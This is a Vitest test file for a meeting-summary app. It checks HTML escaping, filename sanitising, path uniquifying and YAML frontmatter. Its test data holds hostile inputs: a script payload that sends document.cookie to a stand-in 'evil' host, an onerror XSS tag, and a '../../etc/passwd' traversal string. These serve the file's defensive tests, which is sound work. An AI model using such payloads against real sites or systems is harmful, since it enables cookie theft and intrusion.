import { describe, it, expect } from 'vitest';
import {
  buildHtmlFragment,
  buildMarkdown,
  buildFilenameStem,
  calendarTitle,
  extractTitleFromSummary,
  uniquifyPath,
  sanitiseForFilename,
} from '../src/main/outputs.js';
import type { JoinedRecordingRow } from '../src/main/state.js';

function row(over: Partial<JoinedRecordingRow> = {}): JoinedRecordingRow {
  return {
    id: 'r1',
    filename: 'Meeting',
    client_name: 'Acme',
    meeting_type_name: 'Client Call',
    start_time: Date.UTC(2026, 6, 27, 13, 59),
    duration_seconds: 600,
    summary_text: 'A summary.',
    transcript_text: 'A transcript.',
    model_snapshot: 'qwen3.5:latest',
    whisper_snapshot: 'turbo',
    vocabulary_sources: null,
    vocabulary_rules_applied: null,
    ...over,
  } as JoinedRecordingRow;
}

describe('HTML output — raw HTML in the summary', () => {
  // marked passes raw HTML through by design. The summary is model
  // output derived from a transcript, and transcripts can be imported
  // from arbitrary files, so it is not content we control. The same
  // fragment is used for the .html file AND the Apple Note body, so a
  // single escape here covers both destinations.
  it('renders an injected script tag as inert text', async () => {
    const html = await buildHtmlFragment(
      row({ summary_text: 'Fine.\n\n<script>fetch("https://evil/"+document.cookie)</script>' }),
      false,
    );
    expect(html).not.toMatch(/<script/i);
    expect(html).toContain('&lt;script&gt;');
  });

  it('defuses an inline event handler', async () => {
    const html = await buildHtmlFragment(
      row({ summary_text: 'Look: <img src=x onerror="alert(1)">' }),
      false,
    );
    expect(html).not.toMatch(/<img/i);
  });

  it('still renders ordinary markdown', async () => {
    const html = await buildHtmlFragment(
      row({
        summary_text:
          '## Decisions\n\n- **Migrate** in Q4\n- See [docs](https://example.com)\n\n> A quote\n',
      }),
      false,
    );
    expect(html).toContain('<h2>');
    expect(html).toContain('<strong>');
    expect(html).toContain('<li>');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('<blockquote>');
  });

  it('leaves comparisons and ampersands readable', async () => {
    const html = await buildHtmlFragment(
      row({ summary_text: 'Latency < 5ms for A & B.' }),
      false,
    );
    expect(html).toContain('&lt; 5ms');
    expect(html).toContain('A &amp; B');
  });

  it('escapes the transcript too', async () => {
    const html = await buildHtmlFragment(
      row({ transcript_text: 'they said <b>bold</b> out loud' }),
      true,
    );
    expect(html).not.toMatch(/<b>bold<\/b>/);
  });
});

describe('filename generation', () => {
  it('prefers a title extracted from the summary', () => {
    const stem = buildFilenameStem(
      row({ summary_text: 'HSBC account review covering cloud strategy\n\nBody.' }),
    );
    expect(stem).toContain('HSBC account review covering cloud strategy');
    expect(stem).toContain('Acme');
  });

  it('falls back to the single calendar meeting before the recording name', () => {
    const cal = (m: object) => JSON.stringify({ subject: '[EXTERNAL] AIB/Teradata: Weekly sync', alternatives: [], ...m });
    const noTitle = '## Actions\n- None agreed.';
    const stem = buildFilenameStem(row({ summary_text: noTitle, calendar_match_json: cal({}) }));
    expect(stem).toContain('Weekly sync');
    expect(stem).not.toContain('EXTERNAL');
    expect(stem).not.toContain('Meeting');
    // Double-booked or contradicted by the transcript: the calendar can't name it.
    expect(calendarTitle({ calendar_match_json: cal({ alternatives: [{}] }) })).toBeNull();
    expect(calendarTitle({ calendar_match_json: cal({ rejectedByTranscript: true }) })).toBeNull();
    expect(calendarTitle({ calendar_match_json: null })).toBeNull();
  });

  it('rejects generic first lines so the recording name is used instead', () => {
    for (const generic of ['Summary', 'Executive Summary', 'Meeting Notes', 'Overview']) {
      expect(extractTitleFromSummary(`${generic}\n\nBody.`)).toBeNull();
    }
  });

  it('rejects a numbered first line', () => {
    expect(extractTitleFromSummary('1. First item\n\nBody')).toBeNull();
  });

  it('rejects a title too short to be descriptive', () => {
    expect(extractTitleFromSummary('Short title')).toBeNull();
  });

  it('truncates a very long title', () => {
    const long = Array.from({ length: 30 }, (_, i) => `word${i}`).join(' ');
    expect(extractTitleFromSummary(long)!.split(/\s+/)).toHaveLength(15);
  });

  it('strips path separators that would escape the client folder', () => {
    // A model-authored title containing a slash must not be able to
    // redirect the write outside its intended directory.
    expect(sanitiseForFilename('Q4 review: strategy/roadmap')).not.toContain('/');
    expect(sanitiseForFilename('../../etc/passwd')).not.toContain('/');
  });

  it('never returns an empty name', () => {
    expect(sanitiseForFilename('   ...   ')).toBe('untitled');
  });
});

describe('uniquifyPath', () => {
  it('returns the path unchanged when nothing is there', () => {
    expect(uniquifyPath(() => false, '/out/a.md', '.md')).toBe('/out/a.md');
  });

  it('does not overwrite an existing summary', () => {
    const taken = new Set(['/out/a.md']);
    expect(uniquifyPath((p) => taken.has(p), '/out/a.md', '.md')).toBe('/out/a (1).md');
  });

  it('keeps counting past the first collision', () => {
    const taken = new Set(['/out/a.md', '/out/a (1).md', '/out/a (2).md']);
    expect(uniquifyPath((p) => taken.has(p), '/out/a.md', '.md')).toBe('/out/a (3).md');
  });
});

describe('markdown frontmatter', () => {
  it('quotes values so a title containing a colon cannot break the YAML', () => {
    const md = buildMarkdown(row({ filename: 'Meeting: part 2 — "notes"' }), false);
    const fm = md.slice(0, md.indexOf('---', 4));
    expect(fm).toContain(JSON.stringify('Meeting: part 2 — "notes"'));
  });

  it('records whether the transcript is embedded', () => {
    expect(buildMarkdown(row(), true)).toContain('transcript_embedded: true');
    expect(buildMarkdown(row(), false)).toContain('transcript_embedded: false');
    expect(buildMarkdown(row(), false)).not.toContain('## Transcript');
  });
});
